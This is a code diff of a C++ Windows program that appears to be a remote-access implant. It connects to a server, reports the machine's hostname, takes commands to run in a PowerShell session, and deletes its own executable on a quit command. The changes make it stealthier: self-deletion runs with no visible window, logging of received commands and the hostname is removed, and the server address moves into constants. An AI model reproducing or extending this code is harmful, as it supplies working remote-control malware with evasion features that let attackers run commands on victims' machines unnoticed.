@@ -1,4 +1,3 @@
-
 #include "PowerShellSession.hpp"
 
 VOID SelfDelete() {
@@ -9,7 +8,7 @@ VOID SelfDelete() {
 
     GetModuleFileNameA(NULL, carrSelfPath, MAX_PATH);
     std::string szCmdLine = "cmd.exe /C timeout /t 1 >nul & del \"" + std::string(carrSelfPath) + "\"";
-    CreateProcessA(NULL, (LPSTR)szCmdLine.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, (LPSTR)szCmdLine.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
@@ -39,7 +38,6 @@ VOID SendComputerName(SOCKET sock) {
 
     }
 
-    std::cout << "Hostname: " << carrComputerName << std::endl;
     szComputerName.append(carrComputerName, dwComputerNameLength);
     PrependStringSize(szComputerName, szFinalComputerName);
     send(sock, szFinalComputerName.data(), szFinalComputerName.length(), 0);
@@ -64,9 +62,8 @@ VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
 
         carrRecvbuf[iBytesReceived] = '\0';
         std::string szCommand(carrRecvbuf);
-        std::cout << "[+] Received command: " << szCommand << "\n";
 
-        if (szCommand == "quit") {
+        if (szCommand == QUIT_COMMAND) {
             bIsRunning = FALSE;
             SelfDelete();
         }
@@ -80,8 +77,6 @@ VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
 
 
 INT main() {
-    const INT iServerPort = AGENT_PORT;
-    const CHAR* szServerIp = "192.168.20.5";
     WSADATA wsaData;
     SOCKET sock = INVALID_SOCKET;
     sockaddr_in serverAddr = {};
@@ -100,9 +95,9 @@ INT main() {
     }
 
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(iServerPort);
+    serverAddr.sin_port = htons(AGENT_PORT);
 
-    if (inet_pton(AF_INET, szServerIp, &serverAddr.sin_addr) != 1) {
+    if (inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr) != 1) {
         std::cerr << "Invalid IP address\n";
         closesocket(sock);
         WSACleanup();
@@ -116,7 +111,7 @@ INT main() {
         return 1;
     }
 
-    std::cout << "[+] Connected to server " << szServerIp << ":" << iServerPort << "\n";
+    std::cout << "[+] Connected to server " << SERVER_IP << ":" << AGENT_PORT << "\n";
 
     SendComputerName(sock);
     CommandListenerLoop(sock, psSession);
